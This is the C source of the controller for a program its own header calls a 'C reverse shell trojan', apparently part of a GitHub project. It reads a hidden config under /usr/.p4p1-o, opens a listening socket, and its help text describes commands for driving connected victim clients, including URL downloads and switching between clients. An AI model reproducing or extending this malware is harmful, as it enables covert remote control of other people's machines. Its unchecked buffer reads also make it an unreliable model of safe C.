/*
 * p4p1-s_linuc.c -> make linux
 *
 * Made by p4p1
 *
 * C reverse shell trojan
 * Do not use this for illegal purposes
 ****/

#include "papi.h"
#include "papimain.h"
#include "papiarg.h"

int main(int argc, char *argv[])
{
	/*
	 * Declare the main variables
	 **/
	struct server_info inf;

	/*
	 * Initialize the variables and read program sys files
	 **/
	init_variables(&inf, argv);

	/*
	 * Check current arguments and send them to the correct
	 * Main function.
	 **/
	check_arg(&inf, argv, argc);

	return 0;
}

/*
 * Usage function
 ***/
void usage(char * exname)
{

	printf("Documentation:\n");
	printf("      %s Is a server for p4p1-o it listens on the port\n", exname);
	printf("      Configured by the installer, if you did not use the\n");
	printf("      Installer please download it from github(https://github.com/p4p1/p4p1)\n");
	printf("Program Usage:\n");
	printf("      When you run this app and a client connects\n");
	printf("      you can use special commands in the command prompt\n");
	printf("      The special ones are:\n");
	printf("          *url -> dowload from a url the path is requiered\n");
	printf("                  by this prompt #!url >\n");
	printf("          &q   -> quit the program correctly\n");
	printf("	  cd   -> Change directory\n");
	printf("          !ch  -> Change client who you are connected to\n");
	printf("Command Usage:\n");
	printf("      %s -cli  -> command line interface only\n", exname);
	printf("      %s -v    -> verbose mode\n", exname);
	printf("      %s -h    -> show this message\n", exname);

}

/*
 *Wrapper for perror / error handling function
 ***/
void error(char * msg, int num)
{
	if (serverThread.ncurses) endwin();
	perror(msg);
	exit(num);
}

/*
 * Initialize all variables and cfg files
 ***/
void init_variables(struct server_info * inf, char * argv[])
{

	FILE * ipfile = fopen("/usr/.p4p1-o/cfg/ip.cfg", "r");
	FILE * portfile = fopen("/usr/.p4p1-o/cfg/port.cfg", "r");
	FILE * unamefile = fopen("/usr/.p4p1-o/cfg/un.cfg", "r");

	char fportbuf[50];
	char fipbuf[50];
	char funbuf[50];
	int enable = 1;
	char c;
	int i;

	if( ipfile == NULL || portfile == NULL || unamefile == NULL) {
		usage(argv[0]);
		error("Cant find the files.", -1);
	} else {

		i = 0;
		while( ( c = fgetc(portfile) ) != EOF ){
			fportbuf[i] = c;
			i++;
		}
		fportbuf[i] = '\0';

		i = 0;
		while( ( c = fgetc(ipfile) ) != EOF ){
			fipbuf[i] = c;
			i++;
		}
		fipbuf[i-1] = '\0';

		i = 0;
		while( ( c = fgetc(unamefile) ) != EOF ){
			funbuf[i] = c;
			i++;
		}
		funbuf[i-1] = '\0';


		strcpy(inf->username, funbuf);
		strcpy(inf->ip, fipbuf);
		inf->portno = atoi(fportbuf);

	}

	inf->s = socket(AF_INET, SOCK_STREAM, 0);
	inf->server.sin_family = AF_INET;
	inf->server.sin_addr.s_addr = INADDR_ANY;
	inf->server.sin_port = htons( inf->portno );

	inf->argo.ncr = 0;
	inf->argo.cli = 0;
	inf->argo.graphic = 0;
	serverThread.ncurses = 0;
	serverThread.cmd = 0;
	serverThread.grtk = 0;

	serverThread.saved_sockets = (int *) malloc(NUMOCLIENTS * sizeof(int));
	serverThread.cliNum = '0';
	serverThread.connectedTo = 0;

	if(inf->s == -1){
		error("Can't init socket.", -1);
	}

	if(inf->portno < 0 || inf->portno > 9999 ){
		error("Unknown port", -1);
	}

	if( strlen(inf->ip) < 0 ){
		error("Unknown ip", -1);
	}

	if (setsockopt(inf->s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
    		error("setsockopt(SO_REUSEADDR) failed", -1);

	fclose(portfile);
	fclose(ipfile);
	fclose(unamefile);

}

/*
 * Exit the program correctly function
 ***/
void quit(int c, int s)
{

	if(serverThread.ncurses){
		clear();
		exitmsg();
		endwin();
	} else if (serverThread.cmd){
		exitmsg();
	}

	close(s);
	exit(c);
}

/*
 * Function to print logo on screen
 ***/
void printlogo(struct server_info * inf)
{
	if(inf->argo.ncr){

		getmaxyx(stdscr, inf->win.row, inf->win.col);

		mvprintw(0, 0, "       _ _       _\n");
	    	mvprintw(1, 0, "  _ __| | | _ __/ |\n");
	    	mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
	    	mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
	    	mvprintw(4, 0, " |_|       |_|\n");
		mvprintw(2, (inf->win.col )/2, "[ NumberOfClients: %c ]", serverThread.cliNum);

	} else if(inf->argo.cli){

		printf("       _ _       _\n");
	    	printf("  _ __| | | _ __/ |\n");
	    	printf(" | '_ \\_  _| '_ \\ |\n");
	    	printf(" | .__/ |_|| .__/_|\n");
	    	printf(" |_|       |_|\n");
		printf("[ NumberOfClients: %c ]", serverThread.cliNum);

	}
}

/*
 * Clear main part of the screen function
 ***/
void clearmain()
{
	int i, q;
	getmaxyx(stdscr, row, col);

	for(q = 1; q < 17; q++){
		for(i = 0; i < col; i++){
			mvprintw(row-q, i, " ");
		}
	}
}

/*
 * Clear prompt row for the next input
 ***/
void clastrow()
{

	int  i;
	getmaxyx(stdscr, row, col);

	for(i = 0; i < col; i++){
		mvprintw(row-1, i, " ");
	}

}


void exitmsg()
{
	if(serverThread.ncurses){

		getmaxyx(stdscr, row, col);
		mvprintw(0, 0, "       _ _       _\n");
		mvprintw(1, 0, "  _ __| | | _ __/ |\n");
		mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
		mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
		mvprintw(4, 0, " |_|       |_|\n");
		mvprintw( row / 2, (col-26) /2, "thank you for using byebye");
		refresh();
		getch();

	} else if(serverThread.cmd){

		printf( "[!] Thank you for using byebye!\n");

	}
}
